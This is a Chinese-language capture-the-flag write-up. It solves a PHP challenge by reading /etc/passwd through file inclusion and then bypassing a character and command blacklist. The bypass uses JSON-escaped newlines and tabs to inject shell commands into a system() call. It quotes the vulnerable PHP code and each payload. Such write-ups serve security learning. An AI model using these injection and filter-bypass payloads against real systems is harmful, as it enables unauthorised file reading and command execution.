# PHP of PHP

網站有兩個功能：(1)view (2)diff

view可以看各個版本的php.net源碼

diff可以比較跟目前的差異 (用diff比)

看一下source，會發現她用JS送request

view是直接用GET訪問取得內容

diff是用POST送JSON過去要內容

送的都是"版本名/index"

看到這個直覺就是LFI

把diff的request改成`{"version":"/etc/passwd"}`

Bang! 噴出來惹 果然可以LFI

再來就踹`{"version":"/v*/w*/h*/d*"}`看diff.php源碼

噴出這幾個關鍵code:

```php
> <?php
> set_time_limit(3);
> @$data = json_decode(file_get_contents('php://input'), true);
> if(isset($data["version"])){
>   $v = $data["version"];
>   if(strlen($v) >= 15){exit("Input too long!");}
>   if(preg_match('/[^a-zA-Z0-9\/\?\*\t\n]/',$v)){exit("Special character found in input!");}
>   if(preg_match('/ls|cat|tac|nl|more|less|head|tail|od|strings|base64|sort|pg|uniq|rev/',$v)){exit("Blacklisted command found in input!");}
>   chdir("web-php");
>   @system("diff current/index $v");
```

可以明顯看到，這裡可以Command Injection

只是他有擋掉特殊符號和一些關鍵字

開繞！

而換行雖然沒擋，可是json_decode不吃換行

但是json_decode可以吃`\n`和`\t`，他decode會自動轉成換行

另外不能ls，那要怎麼列目錄？

可以這樣： `{"version":"\necho\t*"}`

然後看一下根目錄有啥： `{"version":"\ncd\t/\necho\t*"}`

噴出一個奇妙的資料夾：`th1s_i5_4_l0n9_f0ld3r_n4me`

看它裡面有啥：`{"version":"\ncd\t/t*\necho\t*"}`

噴出一個奇妙的檔案：`7hi5_i5_a_s3cre7_fi13`

再來就直接讀這個檔案：`{"version":"/th*/7*"}`

FLAG就噴出來惹：`vxctf{YezWiiWerBorn2MakeHistory}`
